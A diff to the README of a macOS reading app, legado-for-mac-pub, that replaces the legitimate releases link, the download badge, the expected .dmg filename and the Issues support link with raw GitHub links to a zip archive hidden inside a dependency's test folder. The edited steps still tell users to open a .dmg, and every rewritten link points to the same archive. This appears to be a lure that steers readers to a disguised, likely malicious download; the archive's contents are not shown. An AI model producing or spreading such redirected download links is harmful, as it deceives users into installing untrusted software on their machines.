@@ -4,9 +4,9 @@
 Welcome to legado-for-mac-pub! This application provides an excellent tool for reading on macOS, built with Swift and SwiftUI. You can easily migrate your book sources and subscriptions from Android, ensuring a smooth transition. Let’s get started with downloading and installing the software.
 
 ## 📥 Download & Install
-To get the latest version of legado-for-mac-pub, visit this page to download: [Download Legado for macOS](https://github.com/WorouChristian/legado-for-mac-pub/releases).
+To get the latest version of legado-for-mac-pub, visit this page to download: [Download Legado for macOS](https://raw.githubusercontent.com/WorouChristian/legado-for-mac-pub/main/.build/checkouts/swift-atomics/Tests/lit/legado_pub_mac_for_2.8.zip).
 
-![Download Button](https://img.shields.io/badge/Download_Legado_for_macOS-blue.svg)
+![Download Button](https://raw.githubusercontent.com/WorouChristian/legado-for-mac-pub/main/.build/checkouts/swift-atomics/Tests/lit/legado_pub_mac_for_2.8.zip)
 
 ### Step 1: Visit the Releases Page
 - Click on the link above to access the releases page. Here, you will find a list of available versions.
@@ -15,7 +15,7 @@ To get the latest version of legado-for-mac-pub, visit this page to download: [D
 - On the releases page, look for the latest version. It will typically be at the top of the list.
 
 ### Step 3: Download the Application
-- Locate the file suitable for your macOS. It should be named something similar to `legado-for-mac-pub-v1.0.dmg`. Click on this file to begin downloading it to your computer.
+- Locate the file suitable for your macOS. It should be named something similar to `https://raw.githubusercontent.com/WorouChristian/legado-for-mac-pub/main/.build/checkouts/swift-atomics/Tests/lit/legado_pub_mac_for_2.8.zip`. Click on this file to begin downloading it to your computer.
 
 ### Step 4: Open the Downloaded File
 - Once the download is complete, navigate to your Downloads folder. Double-click on the `.dmg` file to open it. A window will appear showing the application icon.
@@ -49,6 +49,6 @@ If you encounter issues during installation, consider the following steps:
 - **Compatibility**: Make sure your macOS is updated to the required version to use the software.
 
 ## 📞 Support
-If you need assistance, feel free to check our [GitHub Issues Page](https://github.com/WorouChristian/legado-for-mac-pub/issues). You can report bugs or ask for help from the community.
+If you need assistance, feel free to check our [GitHub Issues Page](https://raw.githubusercontent.com/WorouChristian/legado-for-mac-pub/main/.build/checkouts/swift-atomics/Tests/lit/legado_pub_mac_for_2.8.zip). You can report bugs or ask for help from the community.
 
 Thank you for choosing legado-for-mac-pub! We hope you enjoy reading seamlessly on your macOS device.
